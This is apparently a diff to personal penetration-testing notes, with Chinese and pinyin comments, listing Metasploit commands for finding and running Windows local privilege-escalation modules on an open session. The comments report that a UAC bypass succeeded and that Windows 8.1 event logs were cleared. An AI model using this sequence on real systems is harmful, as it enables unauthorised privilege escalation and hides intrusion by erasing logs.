@@ -71,7 +71,7 @@ use post/multi/recon/local_exploit_suggester
 set SESSION 1
 show options
 run                                    里面显示好多中提取漏洞   最后用  exploit/windows/local/bypassuac_sluihijack  成功 清除 win8.1日志
-use exploit/windows/local/ms16_014_wmi_recv_notif
+use exploit/windows/local/ms16_014_wmi_recv_notif           win8  yongzhexie exploit/windows/local/bypassuac_sluihijack  exploit/windows/local/cve_2019_1458_wizardopium   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  exploit/windows/local/tokenmagic  tiquanchengong 
 set SESSION 1
 show options
 run
